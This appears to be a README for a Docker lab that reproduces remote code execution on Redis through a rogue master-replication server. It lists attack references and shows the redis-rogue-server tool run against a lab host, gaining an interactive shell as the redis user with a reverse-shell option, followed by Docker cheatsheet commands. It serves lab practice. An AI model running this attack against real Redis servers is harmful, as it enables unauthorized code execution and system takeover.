02/10/2021
# Reference
Redis master-slave Installation
https://laptrinh.vn/books/redis/page/huong-dan-cai-dat-redis-master-slave-tren-centos-7
Redis attacks:
https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
https://paper.seebug.org/977/
https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
https://www.youtube.com/watch?v=Jmv-0PnoJ6c
https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
https://github.com/n0b0dyCN/redis-rogue-server



# Build
```
.\start.bat
```
# Attack
```
root@attack-server:/opt/redis-rogue-server# python3 redis-rogue-server.py --rhost 192.168.0.4 --lhost 192.168.0.5
______         _ _      ______                         _____
| ___ \       | (_)     | ___ \                       /  ___|
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|
                                     __/ |
                                    |___/
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.0.4:6379
[info] SERVER 192.168.0.5:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.
[<<] id
[>>] =☺uid=998(redis) gid=996(redis) groups=996(redis)
[<<] whoami
[>>] redis
```

# Docker command cheatsheet

Build image from Dockerfile
```
docker build -t redis-master .
docker run -itd --name redis-master redis-master
docker exec -it redis-master bash
```
Build docker-compose (create image, create and start container)
```
docker-compose up -d
```
Clean docker-compose (Stop container, delete container, delete image)
```
docker-compose down --rmi all
```
docker-compose
```
docker-compose ps
docker-compose stop
docker-compose start
```
clear build cache
```
docker builder prune
```